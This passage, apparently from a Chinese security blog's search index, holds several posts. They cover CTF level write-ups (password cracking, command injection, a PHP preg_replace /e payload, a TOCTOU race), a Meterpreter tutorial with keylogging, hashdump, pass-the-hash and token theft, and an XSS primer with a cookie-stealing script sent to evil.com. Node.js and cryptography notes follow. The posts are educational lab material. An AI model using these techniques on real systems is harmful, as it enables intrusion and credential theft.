src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812092358.png\" alt=\"\"></p>\n<h3 id=\"level06\"><a href=\"#level06\" class=\"headerlink\" title=\"level06\"></a>level06</h3><p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812093638.png\" alt=\"\"></p>\n<p>提示我们破解登陆密码，看下passwd文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812094039.png\" alt=\"\"></p>\n<p>直接用john爆破，得到密码</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812095058.png\" alt=\"\"></p>\n<p>登录获取flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812095242.png\" alt=\"\"></p>\n<h3 id=\"level07\"><a href=\"#level07\" class=\"headerlink\" title=\"level07\"></a>level07</h3><p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812100624.png\" alt=\"\"></p>\n<p>在7007端口开了http服务</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812100517.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812100606.png\" alt=\"\"></p>\n<p>命令注入</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812101654.png\" alt=\"\"></p>\n<p>读取flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812101733.png\" alt=\"\"></p>\n<h3 id=\"level08\"><a href=\"#level08\" class=\"headerlink\" title=\"level08\"></a>level08</h3><p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812101927.png\" alt=\"\"></p>\n<p>有个流量包</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812102549.png\" alt=\"\"></p>\n<p>用wireshark打开，看到登录信息，但密码后面还有点东西</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812103026.png\" alt=\"\"></p>\n<p>hex查看，是7f和0d</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812103251.png\" alt=\"\"></p>\n<p>对照不可见字符表得知7f是删除键，0d是CR键，也就是回车</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812104223.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812104255.png\" alt=\"\"></p>\n<p>那么密码就是backdoor退格退格退格00Rm8退格ate回车，也就是backd00Rmate</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812105450.png\" alt=\"\"></p>\n<h3 id=\"level09\"><a href=\"#level09\" class=\"headerlink\" title=\"level09\"></a>level09</h3><p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812111959.png\" alt=\"\"></p>\n<p>有个php文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812111921.png\" alt=\"\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">spam</span><span class=\"params\">($email)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t$email = preg_replace(<span class=\"string\">\"/\\./\"</span>, <span class=\"string\">\" dot \"</span>, $email);</span><br><span class=\"line\">\t$email = preg_replace(<span class=\"string\">\"/@/\"</span>, <span class=\"string\">\" AT \"</span>, $email);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> $email;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">markup</span><span class=\"params\">($filename, $use_me)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t$contents = file_get_contents($filename);</span><br><span class=\"line\"></span><br><span class=\"line\">\t$contents = preg_replace(<span class=\"string\">\"/(\\[email (.*)\\])/e\"</span>, <span class=\"string\">\"spam(\\\"\\\\2\\\")\"</span>, $contents);</span><br><span class=\"line\">\t$contents = preg_replace(<span class=\"string\">\"/\\[/\"</span>, <span class=\"string\">\"&lt;\"</span>, $contents);</span><br><span class=\"line\">\t$contents = preg_replace(<span class=\"string\">\"/\\]/\"</span>, <span class=\"string\">\"&gt;\"</span>, $contents);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> $contents;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$output = markup($argv[<span class=\"number\">1</span>], $argv[<span class=\"number\">2</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">print</span> $output;</span><br></pre></td></tr></table></figure>\n\n<p>php代码用正则进行了一系列替换，并且flag09直接输出php处理后的结果</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812113149.png\" alt=\"\"></p>\n<p>但这里<code>$contents = preg_replace(&quot;/(\\[email (.*)\\])/e&quot;, &quot;spam(\\&quot;\\\\2\\&quot;)&quot;, $contents);</code>用到了/e模式，如果启用该模式，那么preg_replace可以造成代码执行。</p>\n<p>如果我们构造<code>[email {${phpinfo()}}]</code>，由于在PHP中双引号包裹的字符串中可以解析变量， <code>${phpinfo()}</code>中的 phpinfo() 会被当做变量先执行，执行后，即变成 <code>${1} (phpinfo())</code>成功执行返回true。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812132108.png\" alt=\"\"></p>\n<p>那么[email {${`cat flag`}}]读取flag即可</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812131711.png\" alt=\"\"></p>\n<h3 id=\"level10\"><a href=\"#level10\" class=\"headerlink\" title=\"level10\"></a>level10</h3><p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200813131426.png\" alt=\"\"></p>\n<p>了解一下TOCTOU。【参考：<a href=\"http://13.58.107.157/archives/6124\" target=\"_blank\" rel=\"noopener\">Windows 0day任意文件读取漏洞POC分析</a>】</p>\n<p>TOCTOU是Time of Check Versus Time of Use的缩写，即文件访问竞态条件漏洞，该漏洞主要原理为应用运行的过程中，在某个操作之前，比如读文件，都会检查一下文件是否存在与是否具有权限，在检查与真正的读取之间的间隔就是一个可以被利用的竞争条件（Race Condition），在这个间隔中我们可以将需要越权读取的文件替换成自己的文件，使其检查过程通过，这样就可以越权读取其他用户的文件。</p>\n<p>flag文件夹下有token，可执行的flag10和flag，flag和token没权限访问，但flag10可以发送文件到主机，看下它的调用过程</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200813141647.png\" alt=\"\"></p>\n<p>用到了一个access函数，access函数判断当前用户是否有操作文件的权限（uid判断），如果当前用户没有针对该文件的权限，则打印ERROR，有则open。但这里存在一个问题，引用wp中作者原话</p>\n<blockquote>\n<p>在早期的单处理操作系统中，这样的代码可能是严谨的，出发点也是好的——因为单处理的话，进程执行完毕后才发生切换。但是在多任务的操作系统中有这样一个问题：在用access检查文件后，这个程序可能受到其他程序的干扰或者发生进程切换，在进程发生切换之后，进程失去了执行流程，并且在它还未再次获得执行时，它欲操作的文件发生改变——邪恶源头是因为access和open都是通过文件路径字符串作为参数的，这个路径可能是一个链接文件。在Linux中，假设要access一个/tmp/lx文件，在access后、open之前，/tmp/lx被替换成了一个链接文件，指向了其他文件（如/etc/passwd），如果这个进程有对/etc/passwd操作的权限，它最终所操作的并不是真正的/tmp/lx，而是/etc/passwd。</p>\n</blockquote>\n<p>简单地说就是access之后，在open文件之前把原来要open的文件链接到一个我们期望的文件。来操作一下</p>\n<p>这里就用这一台靶机，用xshell开三个窗口即可，这里简称x1,x2,x3</p>\n<p>x1在有权限创建文件的目录下新建一个文件，这里以/tmp/token为例，然后再新建一个执行脚本的文件，不停的改掉token10的指向，内容如下</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200813193843.png\" alt=\"\"></p>\n<p>赋予权限并执行</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200813193929.png\" alt=\"\"></p>\n<p>x2使用nc命令监听自己的18211（./flag10发送文件的端口，测试得知）准备接受文件，这里用-k来保持持续的链接状态</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200813194931.png\" alt=\"\"></p>\n<p>x3同样在tmp目录下新建一个文件yy，内容如下（红框部分为接受文件的地址）</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200813194039.png\" alt=\"\"></p>\n<p>这里的nice命令是更改优先序来执行程序，它的数值是-20到19，数字越大级别越低，把flag10的优先级变为最低，就有机会在access之后，open之前介入进程改掉/tmp/token10的指向</p>\n<p>同样赋予权限并执行</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200813195135.png\" alt=\"\"></p>\n<p>这时执行后可以看到随着不停的将token10指向flag，token被读取</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200813195411.png\" alt=\"\"></p>\n<p>token就是flag10用户的密码，登录即得flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200813200207.png\" alt=\"\"></p>\n","categories":["ichunqiu综合渗透练习"]},{"title":"meterpreter基本使用","url":"/2020/07/27/msf_note4/","content":"<p>meterpreter是Metasploit框架的一个扩展模块，可以调用Metasploit的一些功能，对目标系统进行更为深入的渗透，这些功能包括反追踪、纯内存工作模式、密码哈希值获取、特权提升、跳板攻击等等</p>\n<p>介绍meterpreter功能特性之前首先攻陷一台系统并取得一个Meterpreter shell，然后再利用meterpreter作为攻击载荷，展示它在进入目标系统后的一些其他攻击方法和技术，这里展示xp，攻击过程前一篇已经写过不再赘述，直接到达取得Meterpreter shell界面</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727111047.png\" alt=\"\"></p>\n<h3 id=\"基本命令\"><a href=\"#基本命令\" class=\"headerlink\" title=\"基本命令\"></a>基本命令</h3><p><strong>screenshot</strong>：获取目标系统活动用户的桌面截图并保存至攻击机</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727134346.png\" alt=\"\"></p>\n<p><strong>sysinfo</strong>：获取系统运行的平台</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727134450.png\" alt=\"\"></p>\n<p><strong>ps</strong>：获取目标系统正在运行的进程</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727134728.png\" alt=\"\"></p>\n<p><strong>获取键盘记录</strong></p>\n<p>使用migrate命令将会话迁移至explorer.exe的进程空间中</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727135047.png\" alt=\"\"></p>\n<p>启动keylog_recoder模块，一段时间后使用ctrl+v终止</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727135253.png\" alt=\"\"></p>\n<p>可以看到记录被保存在了txt文件中，内容正是记录期间目标靶机的键盘使用记录</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727135811.png\" alt=\"\"></p>\n<h3 id=\"挖掘用户名和密码\"><a href=\"#挖掘用户名和密码\" class=\"headerlink\" title=\"挖掘用户名和密码\"></a>挖掘用户名和密码</h3><p>除了上述键盘记录可以获取用户密码等敏感信息之外，Meterpreter也可以获取系统本地文件中的用户名和密码</p>\n<h4 id=\"获取密码哈希值\"><a href=\"#获取密码哈希值\" class=\"headerlink\" title=\"获取密码哈希值\"></a>获取密码哈希值</h4><p>使用<code>use priv</code>命令，意味着运行在特权账户上，使用<code>hashdump</code>命令可以获取目标系统所有的用户名和密码哈希值</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727140617.png\" alt=\"\"></p>\n<h4 id=\"传递哈希值\"><a href=\"#传递哈希值\" class=\"headerlink\" title=\"传递哈希值\"></a>传递哈希值</h4><p>虽然我们提取到了用户名和密码的哈希值，但如果密码设置复杂，我们就不能在可接受的时间内将明文密码破解出来。如果不知道明文密码，如何通过这个用户账号登录到更多的主机呢。</p>\n<p>这里将用到哈希传递技术，仅仅有密码的哈希值就够了，而不需要将密码明文，Metasploit的<code>windows/smb/psexec</code>模块就可以实现</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">use exploit&#x2F;windows&#x2F;smb&#x2F;psexec </span><br><span class=\"line\">show options</span><br><span class=\"line\">set RHOST 192.168.48.134</span><br><span class=\"line\">set LHOST 192.168.48.128</span><br><span class=\"line\">set LPORT 443</span><br><span class=\"line\">set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class=\"line\">set SMBUser Administrator</span><br><span class=\"line\">show options</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"令牌假冒\"><a href=\"#令牌假冒\" class=\"headerlink\" title=\"令牌假冒\"></a>令牌假冒</h4><p>使用ps可以看到目标靶机的进程以及运行这些应用的用户账号</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727190150.png\" alt=\"\"></p>\n<p>使用<code>steal_token</code>命令和PID参数来盗取管理员用户的令牌</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727190636.png\" alt=\"\"></p>\n<p>现在Metasploit是以管理员用户来运行的了。</p>\n<p>有时候ps不能列出域管理员运行的进程，我们可以使用<code>incognito</code>命令列举出系统上可以利用的令牌</p>\n<p>通过<code>use incognito</code>命令加载incognito模块，然后通过<code>list_token -u</code>命令列举出令牌</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727191029.png\" alt=\"\"></p>\n<p>然后使用<code>impersonate_token</code>命令扮演令牌，注意这里要用两个斜杠</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727191212.png\" alt=\"\"></p>\n<p>现在就成功假冒为管理员并具有相应权限了。</p>\n<h3 id=\"使用Metasploit脚本\"><a href=\"#使用Metasploit脚本\" class=\"headerlink\" title=\"使用Metasploit脚本\"></a>使用Metasploit脚本</h3><p>通过<code>run [name]</code>命令可以在Meterpreter终端中执行扩展脚本，下面列出几个常用脚本</p>\n<p><strong>run vnc</strong>：将受控系统的桌面通信通过隧道方式映射过来，使得你可以访问到图形化桌面</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727201813.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727201848.png\" alt=\"\"></p>\n<p><strong>run  post/windows/manage/migrate</strong>：将Metasploit会话迁移至内存空间的其他稳定的，不会被关闭的服务进程中，以维持稳定的系统控制连接</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727202151.png\" alt=\"\"></p>\n<p><strong>run killav</strong>：可以关闭某些智能化防毒软件和主机入侵防御产品</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727202421.png\" alt=\"\"></p>\n<p><strong>run hashdump</strong>：获取密码哈希值</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">meterpreter &gt; run hashdump </span><br><span class=\"line\">[*] Obtaining the boot key...</span><br><span class=\"line\">[*] Calculating the hboot key using SYSKEY a4a0fd97de24e4ad0028b54c7dd055d0...</span><br><span class=\"line\">&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;lib&#x2F;rex&#x2F;script&#x2F;base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class=\"line\">[*] Obtaining the user list and keys...</span><br><span class=\"line\">[*] Decrypting user keys...</span><br><span class=\"line\">&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;lib&#x2F;rex&#x2F;script&#x2F;base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class=\"line\">&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;lib&#x2F;rex&#x2F;script&#x2F;base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class=\"line\">&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;lib&#x2F;rex&#x2F;script&#x2F;base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class=\"line\">[*] Dumping password hints...</span><br><span class=\"line\"></span><br><span class=\"line\">No users with password hints on this system</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Dumping password hashes...</span><br><span class=\"line\"></span><br><span class=\"line\">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class=\"line\">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class=\"line\">HelpAssistant:1000:b3d8d3ca5e354eb1eee90cccd2029f2d:99418b20ca08597feaadf1959619e0a2:::</span><br><span class=\"line\">SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:2098344bc829d0d369d7d324bf8eb16c:::</span><br><span class=\"line\">blacknight:1005:44efce164ab921caaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>\n\n<p><strong>run packetrecorder -i 1</strong>：查看目标机的所有流量</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727202711.png\" alt=\"\"></p>\n<p><strong>run scraper</strong>：scraper可以列举出系统上的绝大部分信息，可以获取用户名和密码，下载全部注册表，挖掘密码哈希值，收集系统信息等等</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727203131.png\" alt=\"\"></p>\n","categories":["渗透测试"],"tags":["metasploit"]},{"title":"xss学习日记(一)","url":"/2019/10/26/note1/","content":"<h4 id=\"1-基本概念\"><a href=\"#1-基本概念\" class=\"headerlink\" title=\"1.基本概念\"></a>1.基本概念</h4><p>XSS（Cross Site Scripting）攻击全称跨站脚本攻击，是一种通过注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序，从而获取更高的权限、私密网页内容、会话和cookie等各种内容的计算机安全漏洞。 恶意网页程序包括JavaScript、Java、HTML等。<a id=\"more\"></a></p>\n<h4 id=\"2-类型\"><a href=\"#2-类型\" class=\"headerlink\" title=\"2.类型\"></a>2.类型</h4><h6 id=\"xss攻击可以分成两大类：\"><a href=\"#xss攻击可以分成两大类：\" class=\"headerlink\" title=\"xss攻击可以分成两大类：\"></a>xss攻击可以分成两大类：</h6><p>(1)非持久型攻击：一次性，仅对当次的页面访问产生影响。用户访问一个被攻击者篡改后的链接后，被植入的攻击脚本被游览器执行，从而达到攻击目的。<br>(2)持久型攻击：攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。</p>\n<h6 id=\"常见的三种XSS攻击类型\"><a href=\"#常见的三种XSS攻击类型\" class=\"headerlink\" title=\"常见的三种XSS攻击类型\"></a>常见的三种XSS攻击类型</h6><p>1.反射型(非持久 后端)：<br>通过浏览器直接“反射”给用户，例如攻击者提前构造一个恶意链接，来诱使用户点击，比如这样的一段链接：<code>www.abc.com/?params=&lt;script&gt;alert(/xss/)&lt;/script&gt;。</code><br>2.存储型(持久 后端)：<br>黑客输入的恶意脚本存储在服务器的数据库中。当其他用户浏览页面包含这个恶意脚本的页面，用户将会受到黑客的攻击。一个场景是攻击者在论坛的楼层中包含了一段JavaScript代码，并且服务器没有正确进行过滤输出，那就会造成浏览这个页面的用户执行这段JavaScript代码。<br>3.DOM Based XSS(持久 前端)：<br>一种利用前端代码漏洞进行攻击的攻击方式，前面的反射型XSS与存储型XSS本质都是利用后端代码的漏洞，payload在响应页面中。DOM Based payload不在服务器发出的HTTP响应页面中，当客户端脚本运行时（渲染页面时），payload才会加载到脚本中执行。<br>例如提供一个免费的wifi，但是提供免费wifi的网关会往你访问的任何页面插入一段脚本或者是直接返回一个钓鱼页面，从而植入恶意脚本。这种直接存在于页面，无须经过服务器返回就是基于本地的XSS攻击。</p>\n<h5 id=\"一个例子\"><a href=\"#一个例子\" class=\"headerlink\" title=\"一个例子\"></a>一个例子</h5><p>本地服务器的的/xssTest 目录下，有一个test.php文件，代码如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    $userName=$_GET[<span class=\"string\">'userName'</span>];                    <span class=\"comment\">//获取用户输入的参数</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;b&gt;\"</span>.$userName.<span class=\"string\">\"&lt;/b&gt;\"</span>;                    <span class=\"comment\">//直接输出用户的参数给前端页面</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>正常情况下，用户提交的姓名可以正确显示在页面上，不会构成XSS攻击，比如，当用户访问以下URL：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://localhost/xssTest/test.php?userName=jack`</span><br></pre></td></tr></table></figure>\n<p>页面会显示：<br><img src=\"https://img-blog.csdnimg.cn/2019103121021226.png\" alt=\"1\"><br>可以看到，用户在URL中输入的参数正常显示在页面上。然后，我们在URL中插入JavaScript代码，如：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://localhost/xssTest/test.php?userName=&lt;script&gt;window.open(http://www.baidu.com)&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>则页面会显示：<br><img src=\"https://img-blog.csdnimg.cn/20191031210340900.png\" alt=\"2\"><br>可以看到，页面没有把userName后面的内容显示出来，而且打开了一个新的标签页,原因是在URL中带有一段打开另一标签页的恶意脚本。<br>这个例子体现了最简单的XSS攻击的完整流程。</p>\n<h6 id=\"XSS-Payload\"><a href=\"#XSS-Payload\" class=\"headerlink\" title=\"XSS Payload\"></a>XSS Payload</h6><p>我们把进行XSS攻击的恶意脚本成为XSS Payload。XSS Payload的本质是JavaScript脚本，所以<strong>JavaScript可以做什么，XSS攻击就可以做什么。</strong><br>一个最常见的XSS Payload就是盗取用户的Cookie,从而发起Cookie劫持攻击。Cookie中，一般会保存当前用户的登录凭证，如果Cookie被黑客盗取，意味着黑客有可能通过Cookie直接登进用户的账户，进行恶意操作。<br>如下所示，攻击者先加载一个远程脚本：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://localhost/xssTest/test.php?userName=&lt;scriipt src=http://www.evil.com/evil.js&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>而真正的XSS Payload，则写在远程脚本evil.js中。在evil.js中，可以通过下列代码窃取用户Cookie：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">var img=document.createElement(<span class=\"string\">\"img\"</span>);</span><br><span class=\"line\">img.src=<span class=\"string\">\"http://www.evil.com/log?\"</span>+escape(document.cookie);  </span><br><span class=\"line\">document.body.appendChild(img);</span><br></pre></td></tr></table></figure>\n<p>这段代码插入了一张看不见的图片，同时把document.cookie作为参数，发到远程服务器。黑客在拿到cookie后，只需要替换掉自身的cookie，就可以登入被盗取者的账户，进行恶意操作。</p>\n<h6 id=\"参考文献来自于百度，csdn-博客园，个人博客站点等\"><a href=\"#参考文献来自于百度，csdn-博客园，个人博客站点等\" class=\"headerlink\" title=\"参考文献来自于百度，csdn,博客园，个人博客站点等\"></a>参考文献来自于百度，csdn,博客园，个人博客站点等</h6><h6 id=\"推荐文章-https-www-cnblogs-com-Renyi-Fan-p-9951407-html\"><a href=\"#推荐文章-https-www-cnblogs-com-Renyi-Fan-p-9951407-html\" class=\"headerlink\" title=\"推荐文章 https://www.cnblogs.com/Renyi-Fan/p/9951407.html\"></a>推荐文章 <a href=\"https://www.cnblogs.com/Renyi-Fan/p/9951407.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/Renyi-Fan/p/9951407.html</a></h6>","categories":["web安全"],"tags":["xss"]},{"title":"初识Node.js","url":"/2020/06/28/node/","content":"<h3 id=\"什么是Node-js以及为什么要用node-js\"><a href=\"#什么是Node-js以及为什么要用node-js\" class=\"headerlink\" title=\"什么是Node.js以及为什么要用node.js\"></a>什么是Node.js以及为什么要用node.js</h3><p>通过翻阅官方手册，得到以下信息</p>\n<blockquote>\n<ul>\n<li>Node.js 是一个开源与跨平台的 JavaScript 运行时环境。</li>\n<li>Node.js 在浏览器外运行 V8 JavaScript 引擎（Google Chrome 的内核）。</li>\n</ul>\n</blockquote>\n<p>由此我们可以简单认为，node.js是一个让JavaScript脱离浏览器之外运行的环境或语言解释器。</p>\n<p>其主要具有以下几个特征：</p>\n<h4 id=\"服务器端JavaScript处理\"><a href=\"#服务器端JavaScript处理\" class=\"headerlink\" title=\"服务器端JavaScript处理\"></a>服务器端JavaScript处理</h4><p>node.js的出现使得javascript代码实现了脱离客户端执行，与传统的web开发者前端使用js，后端服务器使用另一种语言如php，python相比，node.js给开发者提供了一个编写后端服务器代码的环境，实现了一定程度上的前后端统一，使得开发者无需学习另一门完全不同的语言，其高度的代码复用性，也大大提升了开发者的效率。</p>\n<h4 id=\"单线程\"><a href=\"#单线程\" class=\"headerlink\" title=\"单线程\"></a>单线程</h4><p>传统的服务器每次一个新用户连到你的网站上时，服务器就得开一个连接。每个连接都需要占一个进程，这些进程大部分时间都是闲着的，因此很容易造成内存浪费，而node.js仅仅使用一个线程。当有用户连接了，就触发一个内部事件，通过非阻塞 I/O、事件驱动机制，使得这种模式正常运转。</p>\n<h4 id=\"非阻断-异步I-O\"><a href=\"#非阻断-异步I-O\" class=\"headerlink\" title=\"非阻断/异步I/O\"></a>非阻断/异步I/O</h4><p>在传统的单线程处理机制中，在执行了访问数据库代码之后，整个线程都将暂停下来，等待数据库返回结果，才能执行后面的代码。也就是说，I/O阻塞了代码的执行，极大地降低了程序的执行效率。而node.js进行I/O操作的时候，将调取后面其他部分的计算，直至I/O完成，然后再进行原来部分I/O操作后的后续计算。通俗的描述就是在一件事没做完之前不要停下来，继续做下一件。</p>\n<h4 id=\"事件驱动\"><a href=\"#事件驱动\" class=\"headerlink\" title=\"事件驱动\"></a>事件驱动</h4><p>非阻断I/O需要事件驱动机制的配合才能顺利运转。在Node.js中，客户端请求建立连接，提交数据等行为，会触发相应的事件，服务器只在用户那边有事件发生的时候才响应。接收到请求，就把它关闭然后进行处理，然后去服务下一个请求。这样，保证了非阻断I/O的顺利进行，提升了效率。</p>\n<p>通过采用单线程，非阻断I/O，事件驱动的模型，node.js在减少内存开销的同时，也大大提升了处理业务的效率。</p>\n<h3 id=\"Node-js的使用方法\"><a href=\"#Node-js的使用方法\" class=\"headerlink\" title=\"Node.js的使用方法\"></a>Node.js的使用方法</h3><h4 id=\"命令行运行node-js脚本\"><a href=\"#命令行运行node-js脚本\" class=\"headerlink\" title=\"命令行运行node.js脚本\"></a>命令行运行node.js脚本</h4><p>安装node.js后，只需在命令行输入node即可进入交互环境</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200628164911.png\" alt=\"\"></p>\n<p>可以直接在命令行中执行js代码</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200628165757.png\" alt=\"\"></p>\n<p>也可执行目录下js脚本</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200628201419.png\" alt=\"\"></p>\n","categories":["web安全"],"tags":["Node.js"]},{"title":"密码学中一些基本知识","url":"/2020/05/10/note11/","content":"<p>在这记录一些做crypto时百度到的基本的概念及实现方法，以便随时查阅，持续补充。</p>\n<a id=\"more\"></a>\n\n<h3 id=\"最基本的求余\"><a href=\"#最基本的求余\" class=\"headerlink\" title=\"最基本的求余\"></a>最基本的求余</h3><p>(1) (a + b) mod p = (a mod p + b mod p) mod p<br>(2) (a -  b) mod p = (a mod p - b mod p) mod p<br>(3) (a * b) mod p = (a mod p * b mod p) mod p</p>\n<h3 id=\"欧几里得算法\"><a href=\"#欧几里得算法\" class=\"headerlink\" title=\"欧几里得算法\"></a>欧几里得算法</h3><p>也称辗转相除法，计算两个正整数的最大公约数，当较小整数为0时，则表明上一次相除已除尽，所以上一次相除时的除数（当次输入的gcd函数中的较大数）是最大公约数。计算公式：</p>\n<p>​                                                                    gcd(a,b) = gcd(b,a mod b)</p>\n<p>a&gt;b且a mod b不为0。</p>\n<p>python递归实现：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">gcd</span><span class=\"params\">(a, b)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> a &lt; b:</span><br><span class=\"line\">        a, b = b, a</span><br><span class=\"line\">    <span class=\"keyword\">while</span> b != <span class=\"number\">0</span>:</span><br><span class=\"line\">        a,b = b,a%b</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a</span><br><span class=\"line\"></span><br><span class=\"line\">a = gcd(<span class=\"number\">6</span>,<span class=\"number\">18</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">print(a)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"乘法逆元\"><a href=\"#乘法逆元\" class=\"headerlink\" title=\"乘法逆元\"></a>乘法逆元</h3><p>正整数 a, n，如果有 ax = 